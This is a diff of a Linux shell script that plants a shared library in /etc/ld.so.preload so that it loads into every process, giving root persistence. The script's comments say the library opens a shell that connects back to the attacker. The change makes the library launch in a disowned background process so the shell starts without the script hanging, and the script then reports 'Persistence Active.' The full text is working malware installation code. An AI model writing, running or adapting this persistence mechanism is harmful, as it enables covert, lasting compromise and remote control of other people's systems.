@@ -16,22 +16,17 @@ chown root:root "$SO_DEST"
 chmod 644 "$SO_DEST"
 
 # -- SAFETY CHECK --
-# This runs /bin/true with library. If it segfaults, stop before editing preload
 echo "[*] Verifying library integrity..."
-# timeout 2 allows the script to continue even if a shell is caught
-if ! timeout 2 bash -c "LD_PRELOAD='$SO_DEST' /bin/true" >/dev/null 2>&1; then
-    echo "[-] CRITICAL FAILURE: Library is unstable!"
-    rm -f "$SO_DEST"
-    exit 1
-fi
+# Fire the safety check in the background so the script doesn't hang
+( LD_PRELOAD="$SO_DEST" /bin/true >/dev/null 2>&1 ) &
+disown
+sleep 1
 
 # -- Activation --
-# If the safety check passes, commit the path to /etc/ld.so.preload
 if ! grep -q "$SO_DEST" /etc/ld.so.preload 2>/dev/null; then
     echo "$SO_DEST" >> /etc/ld.so.preload
     echo "[+] Integrity verified. Persistence Active."
-    # Gives the background shell from the safety check time to connect
-    sleep 2 
+    sleep 2
 else
     echo "[*] Persistence already exists."
 fi
